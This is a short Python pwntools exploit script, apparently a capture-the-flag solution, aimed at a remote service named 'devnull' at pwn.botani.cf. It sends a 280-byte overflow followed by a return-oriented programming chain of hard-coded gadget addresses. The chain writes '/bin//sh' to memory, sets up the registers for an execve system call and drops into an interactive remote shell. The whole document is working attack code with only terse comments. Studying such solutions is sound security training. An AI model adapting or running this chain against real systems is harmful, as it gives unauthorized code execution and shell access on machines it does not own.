from pwn import * 

r = remote('pwn.botani.cf',3240)
#r = process('./devnull')

pop_rax  = 0x044d4f4
pop_rdx  = 0x0437445
pop_rsi  = 0x0401827
pop_rdi  = 0x0401713
rax_rdx  = 0x0444c2e
syscall  = 0x045b765
writable = 0x06c1c40 
bin_sh   = "/bin//sh" 
exit     = 0x04075f0

buff=""
# write "/bin/sh" to some writable location
buff+="A"*280
buff+=p64(pop_rax)
buff+=p64(writable)
buff+=p64(pop_rdx)
buff+=bin_sh
buff+=p64(rax_rdx)

# rdi = writable location
buff+=p64(pop_rdi)
buff+=p64(writable)

# rdx = 0x0
buff+=p64(pop_rdx)
buff+=p64(0x0)

# rsi = 0x0
buff+=p64(pop_rsi)
buff+=p64(0x0)

# rax = 0x3b
buff+=p64(pop_rax)
buff+=p64(0x3b)

# syscall
buff+=p64(syscall)
buff+=p64(exit)
#print buff
print r.recv()
r.sendline(buff)
print r.recv()
r.interactive()
